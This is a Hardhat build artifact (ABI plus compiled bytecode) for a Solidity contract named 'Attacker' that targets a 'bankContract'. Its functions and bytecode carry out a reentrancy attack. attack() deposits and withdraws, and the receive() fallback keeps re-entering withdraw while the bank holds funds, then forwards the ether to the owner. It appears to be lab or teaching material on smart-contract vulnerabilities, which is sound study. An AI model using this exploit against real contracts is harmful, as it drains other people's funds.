{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "bankContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bankContract",
      "outputs": [
        {
          "internalType": "contract IBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b50604051610a80380380610a808339818101604052810190610032919061016c565b61004e61004361008b60201b60201c565b61009360201b60201c565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b81525050506101de565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600081519050610166816101c7565b92915050565b60006020828403121561017e57600080fd5b600061018c84828501610157565b91505092915050565b60006101a0826101a7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101d081610195565b81146101db57600080fd5b50565b60805160601c61086a610216600039600081816057015281816095015281816102390152818161036101526103e2015261086a6000f3fe60806040526004361061004e5760003560e01c806307c2e4491461016e578063715018a6146101995780638da5cb5b146101b05780639e5faafc146101db578063f2fde38b146101e557610169565b366101695760007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610118577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b50505050610167565b61012061020e565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610165573d6000803e3d6000fd5b505b005b600080fd5b34801561017a57600080fd5b50610183610237565b60405161019091906106e3565b60405180910390f35b3480156101a557600080fd5b506101ae61025b565b005b3480156101bc57600080fd5b506101c561020e565b6040516101d291906106c8565b60405180910390f35b6101e36102e3565b005b3480156101f157600080fd5b5061020c6004803603810190610207919061063b565b610462565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b7f000000000000000000000000000000000000000000000000000000000000000081565b61026361055a565b73ffffffffffffffffffffffffffffffffffffffff1661028161020e565b73ffffffffffffffffffffffffffffffffffffffff16146102d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102ce9061071e565b60405180910390fd5b6102e16000610562565b565b6102eb61055a565b73ffffffffffffffffffffffffffffffffffffffff1661030961020e565b73ffffffffffffffffffffffffffffffffffffffff161461035f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103569061071e565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103c757600080fd5b505af11580156103db573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561044857600080fd5b505af115801561045c573d6000803e3d6000fd5b50505050565b61046a61055a565b73ffffffffffffffffffffffffffffffffffffffff1661048861020e565b73ffffffffffffffffffffffffffffffffffffffff16146104de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104d59061071e565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561054e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610545906106fe565b60405180910390fd5b61055781610562565b50565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b6000813590506106358161081d565b92915050565b60006020828403121561064d57600080fd5b600061065b84828501610626565b91505092915050565b61066d8161074f565b82525050565b61067c81610781565b82525050565b600061068f60268361073e565b915061069a826107a5565b604082019050919050565b60006106b260208361073e565b91506106bd826107f4565b602082019050919050565b60006020820190506106dd6000830184610664565b92915050565b60006020820190506106f86000830184610673565b92915050565b6000602082019050818103600083015261071781610682565b9050919050565b60006020820190508181036000830152610737816106a5565b9050919050565b600082825260208201905092915050565b600061075a82610761565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061078c82610793565b9050919050565b600061079e82610761565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6108268161074f565b811461083157600080fd5b5056fea26469706673582212204aa50f869d025ad1401a7fc6fe955c3b4c810c91784a8f9d5cd8b6dbdd5fcaec64736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}